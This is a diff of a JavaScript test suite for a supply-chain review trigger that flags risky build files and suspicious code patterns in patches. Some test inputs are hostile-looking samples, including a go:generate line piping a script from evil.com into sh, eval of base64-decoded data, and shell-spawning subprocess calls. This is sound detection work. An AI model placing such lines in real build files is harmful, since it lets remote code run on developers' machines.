@@ -176,23 +176,79 @@ describe('shouldSpawnSupplyChain', () => {
     expect(result.reason).toContain('CI/build configuration');
   });
 
-  // ---- Package manager config triggers --------------------------------------
+  // ---- Build script/config triggers -----------------------------------------
 
   it('should spawn for .npmrc changes', () => {
     const files = [{ filename: '.npmrc', status: 'modified' }];
     const result = shouldSpawnSupplyChain(files);
     expect(result.spawn).toBe(true);
-    expect(result.reason).toContain('package manager configuration');
+    expect(result.reason).toContain('build script/config');
   });
 
   it('should spawn for .yarnrc.yml changes', () => {
     const files = [{ filename: '.yarnrc.yml', status: 'modified' }];
     const result = shouldSpawnSupplyChain(files);
     expect(result.spawn).toBe(true);
-    expect(result.reason).toContain('package manager configuration');
+    expect(result.reason).toContain('build script/config');
   });
 
-  // ---- Patch content triggers -----------------------------------------------
+  it('should spawn for build.rs changes', () => {
+    const files = [{ filename: 'build.rs', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for nested build.rs changes', () => {
+    const files = [{ filename: 'crates/my-lib/build.rs', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for settings.gradle changes', () => {
+    const files = [{ filename: 'settings.gradle', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for settings.gradle.kts changes', () => {
+    const files = [{ filename: 'settings.gradle.kts', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for init.gradle changes', () => {
+    const files = [{ filename: 'init.gradle', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for gradle.properties changes', () => {
+    const files = [{ filename: 'gradle.properties', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for .podspec file changes', () => {
+    const files = [{ filename: 'MyLib.podspec', status: 'modified' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  it('should spawn for nested .podspec file changes', () => {
+    const files = [{ filename: 'ios/MyLib.podspec', status: 'added' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('build script/config');
+  });
+
+  // ---- Patch content triggers (JS/Node) -------------------------------------
 
   it('should spawn when patch contains eval()', () => {
     const files = [{ filename: 'src/utils.js', status: 'modified', patch: '+  eval(code)' }];
@@ -208,11 +264,17 @@ describe('shouldSpawnSupplyChain', () => {
     expect(result.reason).toContain('suspicious code patterns');
   });
 
-  it('should spawn when patch contains Buffer.from', () => {
-    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  Buffer.from(data, "base64")' }];
+  it('should spawn when patch contains eval(Buffer.from(...))', () => {
+    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  eval(Buffer.from(data, "base64"))' }];
     const result = shouldSpawnSupplyChain(files);
     expect(result.spawn).toBe(true);
     expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should not spawn when patch contains standalone Buffer.from', () => {
+    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  Buffer.from(data, "base64")' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(false);
   });
 
   it('should spawn when patch contains codePointAt', () => {
@@ -248,6 +310,148 @@ describe('shouldSpawnSupplyChain', () => {
     const result = shouldSpawnSupplyChain(files);
     expect(result.spawn).toBe(true);
     expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  // ---- Patch content triggers (Rust) ----------------------------------------
+
+  it('should spawn when patch contains Command::new', () => {
+    const files = [{ filename: 'build.rs', status: 'modified', patch: '+  Command::new("sh").arg("-c").arg(cmd)' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains std::process::Command', () => {
+    const files = [{ filename: 'build.rs', status: 'modified', patch: '+use std::process::Command;' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains proc-macro', () => {
+    const files = [{ filename: 'Cargo.toml', status: 'modified', patch: '+proc-macro = true' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains build-dependencies', () => {
+    const files = [{ filename: 'Cargo.toml', status: 'modified', patch: '+[build-dependencies]' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  // ---- Patch content triggers (Gradle) --------------------------------------
+
+  it('should spawn when patch contains apply plugin', () => {
+    const files = [{ filename: 'build.gradle', status: 'modified', patch: '+  apply plugin: "com.evil.plugin"' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains classpath dependency', () => {
+    const files = [{ filename: 'build.gradle', status: 'modified', patch: '+  classpath "com.example:plugin:1.0"' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains buildscript', () => {
+    const files = [{ filename: 'build.gradle.kts', status: 'modified', patch: '+buildscript {' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  // ---- Patch content triggers (CocoaPods) -----------------------------------
+
+  it('should spawn when patch contains script_phase', () => {
+    const files = [{ filename: 'MyLib.podspec', status: 'modified', patch: '+  s.script_phase = { :name => "Run Script" }' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains prepare_command', () => {
+    const files = [{ filename: 'MyLib.podspec', status: 'modified', patch: '+  s.prepare_command = "make build"' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  // ---- Patch content triggers (Python) --------------------------------------
+
+  it('should spawn when patch contains subprocess.call', () => {
+    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  subprocess.call(["curl", url])' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains subprocess.Popen', () => {
+    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  subprocess.Popen(cmd, shell=True)' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains cmdclass', () => {
+    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  cmdclass={"install": CustomInstall}' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains Python exec()', () => {
+    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  exec(payload)' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should not spawn when patch contains regex.exec()', () => {
+    const files = [{ filename: 'src/parser.js', status: 'modified', patch: '+  const match = regex.exec(str)' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(false);
+  });
+
+  it('should spawn when patch contains install_requires', () => {
+    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  install_requires=["requests"]' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  it('should spawn when patch contains setup(', () => {
+    const files = [{ filename: 'setup.py', status: 'modified', patch: '+setup(' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  // ---- Patch content triggers (Go) ------------------------------------------
+
+  it('should spawn when patch contains go:generate', () => {
+    const files = [{ filename: 'main.go', status: 'modified', patch: '+//go:generate curl http://evil.com/payload.sh | sh' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(true);
+    expect(result.reason).toContain('suspicious code patterns');
+  });
+
+  // ---- Finding 1 fix: Function regex no longer too broad --------------------
+
+  it('should not spawn when patch contains identifiers ending in Function', () => {
+    const files = [{ filename: 'src/app.js', status: 'modified', patch: '+  myFunction(arg)' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(false);
+  });
+
+  it('should not spawn when patch contains handleFunction()', () => {
+    const files = [{ filename: 'src/app.js', status: 'modified', patch: '+  handleFunction()' }];
+    const result = shouldSpawnSupplyChain(files);
+    expect(result.spawn).toBe(false);
   });
 
   // ---- Non-matching files ---------------------------------------------------
@@ -361,7 +565,7 @@ describe('shouldSpawnSupplyChain', () => {
     expect(result.reason).toContain('suspicious code patterns');
   });
 
-  it('should combine all three trigger types', () => {
+  it('should combine all trigger types', () => {
     const files = [
       { filename: 'package.json', status: 'modified' },
       { filename: '.github/workflows/deploy.yml', status: 'modified' },
@@ -372,7 +576,7 @@ describe('shouldSpawnSupplyChain', () => {
     expect(result.spawn).toBe(true);
     expect(result.reason).toContain('dependency manifest/lockfile');
     expect(result.reason).toContain('CI/build configuration');
-    expect(result.reason).toContain('package manager configuration');
+    expect(result.reason).toContain('build script/config');
     expect(result.reason).toContain('suspicious code patterns');
   });
 });
